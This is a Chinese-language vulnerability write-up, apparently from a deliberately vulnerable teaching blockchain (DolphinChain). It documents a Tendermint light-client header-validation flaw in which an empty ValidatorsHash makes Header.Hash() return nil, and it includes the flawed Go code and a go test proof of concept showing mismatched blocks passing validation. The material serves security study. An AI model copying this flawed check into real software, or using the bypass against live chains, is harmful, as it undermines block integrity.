# [DC-05] 区块头验证不当

## 漏洞标签

`header`;

`validate`;

## 漏洞描述

区块头验证不当(Improper Check of Header)

验证区块头时，会检验被验证区块和经过签名的区块是否合法。对`ValidatorsHash`验证不当。因为`lite`客户端在发送时不会加上`ValidatorsHash`，所以对于`lite`客户端来说`ValidatorsHash`恒为空。这样就使得不同的区块可以通过验证。

## 漏洞分析

```go
func ValidateBlock(meta *types.Block, sh types.SignedHeader) error {
    if meta == nil {
        return errors.New("expecting a non-nil Block")
    }
    err := ValidateHeader(&meta.Header, sh) // XuanMao: track
    if err != nil {
        return err
    }
    if !bytes.Equal(meta.Data.Hash(), meta.Header.DataHash) {
        return errors.New("Data hash doesn't match header")
    }
    return nil
    }
```

```go
func ValidateHeader(head *types.Header, sh types.SignedHeader) error {
    if head == nil {
        return errors.New("expecting a non-nil Header")
    }
    if sh.Header == nil {
        return errors.New("unexpected empty SignedHeader")
    }
    // Make sure they are for the same height (obvious fail).
    if head.Height != sh.Height {
        return errors.New("Header heights mismatched")
    }
    // Check if they are equal by using hashes.
    if !bytes.Equal(head.Hash(), sh.Hash()) {//XuanMao: Track
        return errors.New("Headers don't match")
    }
    return nil
}
```

```golang
func (h *Header) Hash() cmn.HexBytes {
 if len(h.ValidatorsHash) == 0 {  // Track
 	return nil
 }
```

## 复现或测试步骤

此处使用test脚本测试

### 使用 go test 脚本测试

```golang
// XuanMao: bug test
func TestLiteValidationIsFallacious(t *testing.T) {
    block := &types.Block{
        Header: types.Header{
            Height: 11,
            Time:   time.Date(2018, 1, 1, 1, 1, 1, 1, time.UTC),
        },
        Data: *new(types.Data),
    }

    t.Log(block)
    commit := types.SignedHeader{
        Header: &types.Header{
            Height: 11,
            Time:   time.Date(2017, 1, 1, 1, 1, 1, 1, time.UTC),
        },
    }
    t.Log(commit)

    if err := proxy.ValidateBlock(block, commit); err == nil {
        t.Log(commit.Hash())
        t.Errorf("Pwned!")
    }
}

```

运行结果

```sh
[root@ main]# go test -v -run=TestLiteValidationIsFallacious
=== RUN   TestLiteValidationIsFallacious
--- FAIL: TestLiteValidationIsFallacious (0.00s)
    hdr_test.go:21: Block{
          Header{
            Version:        {0 0}
            ChainID:        
            Height:         11
            Time:           2018-01-01 01:01:01.000000001 +0000 UTC
            NumTxs:         0
            TotalTxs:       0
            LastBlockID:    :0:000000000000
            LastCommit:     
            Data:           
            Validators:     
            NextValidators: 
            App:            
            Consensus:       
            Results:        
            Evidence:       
            Proposer:       
          }#
          Data{
            
          }#
          EvidenceData{
            
          }#
          nil-Commit
        }#
    hdr_test.go:28: SignedHeader{
          Header{
            Version:        {0 0}
            ChainID:        
            Height:         11
            Time:           2017-01-01 01:01:01.000000001 +0000 UTC
            NumTxs:         0
            TotalTxs:       0
            LastBlockID:    :0:000000000000
            LastCommit:     
            Data:           
            Validators:     
            NextValidators: 
            App:            
            Consensus:       
            Results:        
            Evidence:       
            Proposer:       
          }#
          nil-Commit
        }
    hdr_test.go:31: 
    hdr_test.go:32: Pwned!
FAIL
exit status 1
FAIL	github.com/XuanMaoSecLab/DolphinChain/reproduce/main	0.070s
```

## 修复

由于不能被直接利用，暂无修复

## 相关资料

漏洞代码参考: [哈希验证](https://github.com/tendermint/tendermint/blob/c8a2bdf78ba7aaaf4284fa78c1b9b05c5e7342bc/types/block.go#L179-L181)

本漏洞相关 `Issue` 见 : [Issue](https://github.com/tendermint/tendermint/issues/1302)
